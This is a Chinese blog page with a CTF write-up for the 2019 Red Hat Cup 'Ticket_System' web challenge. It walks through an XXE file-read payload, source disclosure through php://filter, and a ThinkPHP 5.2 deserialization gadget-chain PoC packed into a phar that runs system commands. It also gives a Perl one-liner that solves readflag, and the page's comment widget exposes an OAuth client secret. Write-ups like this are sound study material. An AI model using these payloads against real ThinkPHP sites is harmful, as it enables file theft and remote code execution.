@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <title>2019红帽杯Ticket_System - 文乐的爸爸</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/images/avatar.png" type="image/png" />
+  <meta name="description" content="菜是原罪祭奠下这道做了一天一夜，最后一点一点做出来的web题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019红帽杯Ticket_System">
+<meta property="og:url" content="https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;2019&#x2F;12&#x2F;11&#x2F;2019%E7%BA%A2%E5%B8%BD%E6%9D%AFTicket_System&#x2F;index.html">
+<meta property="og:site_name" content="文乐的爸爸">
+<meta property="og:description" content="菜是原罪祭奠下这道做了一天一夜，最后一点一点做出来的web题。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20191111211743428.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20191111211925823.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20191111213554346.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20191111213646305.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2019111121383598.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-12-11T07:58:16.363Z">
+<meta property="article:modified_time" content="2019-12-11T14:34:08.513Z">
+<meta property="article:author" content="Stao">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php反序列化">
+<meta property="article:tag" content="xxe">
+<meta property="article:tag" content="readflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20191111211743428.JPG?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng&#x3D;&#x3D;,size_16,color_FFFFFF,t_70">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1576074970399">
+<meta name="generator" content="Hexo 4.1.0"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Stao" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Stao">
+            <img src="/images/avatar.png" alt="Stao">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>1</div>
+        <div><span>标签</span>4</div>
+        <div><span>分类</span>1</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/ctfer-Stao" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/readflag/" style="font-size: 10px;">readflag</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a>
+    </div>
+    
+  </div>
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Stao
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="http://p2.ssl.qhimg.com/t01433a38e76e65c858.jpg">
+        
+        <h1>2019红帽杯Ticket_System</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年12月11日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.1k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/readflag/" rel="tag">readflag</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/web/" rel="tag">web</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/xxe/" rel="tag">xxe</a>
+    
+  </div>
+  <article>
+    <h1 id="菜是原罪"><a href="#菜是原罪" class="headerlink" title="菜是原罪"></a>菜是原罪</h1><p>祭奠下这道做了一天一夜，最后一点一点做出来的web题。</p>
+<a id="more"></a>
+
+
+<p>进入题目是一个登陆界面，查看源码发现</p>
+<pre><code> &lt;!-- hint in /hints.txt --&gt;
+&lt;!-- Not the web root directory. In the ystem root directory--&gt;</code></pre><p>随便输入用户名和密码可以进入到后台提交Ticke，可上传xml，也可以直接提交。这里容易想到xxe漏洞，试着上传文件，发现是白名单限制，只能上传xml文件，而且有给出目录。填写信息提交表单，抓包发现后台是可以解析xml的，所以利用xxe进行任意文件读取<br><img src="https://img-blog.csdnimg.cn/20191111211743428.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY f SYSTEM &quot;file:///hints.txt&quot;&gt;
+]&gt;
+&lt;user&gt;
+&lt;username&gt;&amp;f;&lt;/username&gt;
+&lt;password&gt;password&lt;/password&gt;
+&lt;/user&gt;</code></pre><p>先读取提示文件<br><img src="https://img-blog.csdnimg.cn/20191111211925823.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说是要尝试RCE。利用PHP expect尝试执行代码，发现不成功，想到了CVE-2017-12629 - Apache Solr XXE &amp; RCE,但是也不行</p>
+<h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>既然可以任意读取文件，那就尝试php://filter/read=convert.base64-encode/resource=index.php读取源码，thinkphp5.2的框架结构跟之前的不一样，比赛的时候总是读不到源码，最后看linux下的thinkphp5.2才发现它的路由在../route/app.php最后读取到 ../app/controller/Ticket.php的源码<br>分析代码：</p>
+<pre><code>&lt;?php
+namespace app\controller;
+use think\facade\Session;
+
+class Ticket extends Base
+{
+public $view;
+public function __construct()
+{
+parent::__construct(TRUE);
+}
+
+public function index()
+{
+return $this-&gt;view-&gt;fetch(&quot;ticket&quot;);
+}
+
+public function upload(){
+$file = request()-&gt;file(&apos;ticket&apos;);
+
+if($file){
+$path =  &apos;/tmp/uploads/&apos; . \md5(session(&quot;username&quot;));
+if(!\is_dir($path))
+mkdir($path, 0777, true);
+$info = $file-&gt;validate([&apos;size&apos;=&gt;15678,&apos;ext&apos;=&gt;&apos;xml&apos;])-&gt;move($path);
+if($info){
+$res = sprintf(&quot;Your file is uploaded at %s &quot;, $path.&apos;/&apos;.$info-&gt;getSaveName());
+echo $res;
+}else{
+echo $file-&gt;getError();
+}
+}
+}
+
+public function postXML(){
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+
+try{
+$dom = new \DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+$creds = \simplexml_import_dom($dom);
+
+$username = $creds-&gt;username;
+$code = $creds-&gt;code;
+
+$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
+
+}catch(Exception $e){
+$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
+}
+return $result;
+}
+
+public function logout()
+{
+Session::clear();
+$this-&gt;success(&apos;Clear Success&apos;, &apos;index&apos;);
+}
+}
+?&gt;</code></pre><p>逻辑很简单，就是实现上传文件和解析XML字符串。</p>
+<h2 id="thinkphp5-2-xxe进行RCE"><a href="#thinkphp5-2-xxe进行RCE" class="headerlink" title="thinkphp5.2+xxe进行RCE"></a>thinkphp5.2+xxe进行RCE</h2><p>在网上找资料发现，thinkphp5.2是存在反序列化漏洞链的，再结合这里可以上传xml文件，而且xml解析器可以触发phar的反序列化，可以想到，利用phar://来触发反序列化漏洞，从而RCE</p>
+<p>在linux在搭建thinkphp5.2，利用github上的反序列化漏洞poc，再结合phar的生成代码，生成phar包<br>poc如下：</p>
+<pre><code>&lt;?php
+namespace think{
+require __DIR__ . &apos;/vendor/autoload.php&apos;;
+use Opis\Closure\SerializableClosure;
+abstract class Model{
+protected $append = [];
+private $data = [];
+protected $visible = [];
+private $withAttr = [];
+function __construct(){
+$this-&gt;data = [&quot;huha&quot;=&gt;&apos;&apos;];
+    # withAttr中的键值要与data中的键值相等
+    $this-&gt;withAttr = [&apos;huha&apos;=&gt; new SerializableClosure(function(){system(&apos;ls&apos;);}) ];
+}
+}
+}
+namespace think\model{
+use think\Model;
+class Pivot extends Model
+{
+}
+}
+namespace think\process\pipes{
+use think\model\Pivot;
+class Windows
+{
+private $files = [];
+public function __construct()
+{
+$this-&gt;files=[new Pivot()];
+}
+}
+}
+namespace{
+$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+use think\process\pipes\Windows;
+ $o=new Windows();
+$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&gt;stopBuffering();
+}
+?&gt;</code></pre><p>命名空间学习文章：<a href="https://www.cnblogs.com/drunkhero/p/namespace.html" target="_blank" rel="noopener">https://www.cnblogs.com/drunkhero/p/namespace.html</a><br>这里还需要下载一个Opis\Closure的包，github上可以下载，下载完改名为ventor覆盖thinkphp5.2下的ventor才可以成功序列化。</p>
+<h2 id="上传phar"><a href="#上传phar" class="headerlink" title="上传phar"></a>上传phar</h2><p>将phar后缀改为xml，上传，得到文件路径，然后在xml中，利用phar://读取phar文件。<br><img src="https://img-blog.csdnimg.cn/20191111213554346.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后读flag发现是没有内容的，所以读readflag<br><img src="https://img-blog.csdnimg.cn/20191111213646305.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读出来看不懂，不知道是什么格式的文件，先留着以后研究。百度，发现读出readflag的poc，直接利用</p>
+<pre><code>perl -e \&apos;use warnings;use strict;use IPC::Open2;$| = 1;chdir (&quot;/&quot;);my $pid = open2(*out2, *in2,&quot;./readflag&quot;) or die;my $reply = &lt;out2&gt;;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;my $answer = eval($reply);print in2 &quot; $answer &quot;;in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;\&apos;</code></pre><p>```<br>成功读取到flag<br><img src="https://img-blog.csdnimg.cn/2019111121383598.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMyOTc5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Stao<br>
+<strong>本文链接：</strong><a href="/https:/ctfer-stao.github.io/2019/12/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFTicket_System/" title="https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;2019&#x2F;12&#x2F;11&#x2F;2019%E7%BA%A2%E5%B8%BD%E6%9D%AFTicket_System&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;2019&#x2F;12&#x2F;11&#x2F;2019%E7%BA%A2%E5%B8%BD%E6%9D%AFTicket_System&#x2F;</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1576074970402"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
